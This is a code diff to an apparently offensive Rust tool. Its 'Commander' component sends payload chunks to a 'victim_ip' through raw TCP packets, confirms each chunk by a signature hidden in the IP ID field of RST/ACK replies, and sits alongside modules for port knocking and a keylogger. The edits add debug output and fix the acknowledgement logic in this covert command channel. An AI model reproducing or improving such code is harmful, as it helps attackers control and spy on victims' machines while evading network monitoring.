@@ -8,6 +8,7 @@ use pnet::transport::{transport_channel, TransportChannelType::Layer3, Transport
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::Packet;
 use pnet::datalink;
+use pnet::packet::tcp::TcpPacket;
 
 mod port_knkr;
 mod keylogger;
@@ -54,7 +55,7 @@ impl Commander {
         let victim_ip = self.victim_ip.expect("No victim IP");
         let local_ip = self.local_ip.expect("No local IP");
         
-        // Convert payload into stateful chunks (handled by covert.rs)
+        // Convert payload into stateful chunks
         let mut state = covert::SenderState::new_from_bytes(payload);
         
         let protocol = Layer3(IpNextHeaderProtocols::Tcp);
@@ -82,22 +83,30 @@ impl Commander {
                     );
 
                     let start = std::time::Instant::now();
-                    // Wait 500ms for the Victim to respond with the signature in the IP ID
+                    // Wait 500ms for the Victim to respond with the signature
                     while start.elapsed() < Duration::from_millis(500) {
                         if let Ok((packet, _)) = rx_iter.next() {
+                            // FIX: Use 'victim_ip' instead of 'target_ip'
                             if packet.get_source() == victim_ip {
+                                // Optional Debug: See the flags coming from the victim
+                                if let Some(tcp) = TcpPacket::new(packet.payload()) {
+                                     // println!("[DEBUG] Packet from Victim. Flags: {:b}", tcp.get_flags());
+                                }
+
                                 if let Some(recv_id) = covert::parse_rst_ack_ip_id(packet.packet()) {
                                     let expected_sig = covert::signature_ip_id(ip_id, raw_word);
                                     if recv_id == expected_sig {
                                         state.ack();
-                                        acked = true;
+                                        acked = true; // FIX: Use the 'acked' variable defined above
                                         break;
+                                    } else {
+                                        println!("[DEBUG] Sig mismatch: Got {}, Expected {}", recv_id, expected_sig);
                                     }
                                 }
                             }
                         }
                     }
-
+                    
                     if !acked {
                         println!("[!] Timeout (Chunk {}), retry {}/5...", state.index, attempts);
                     }
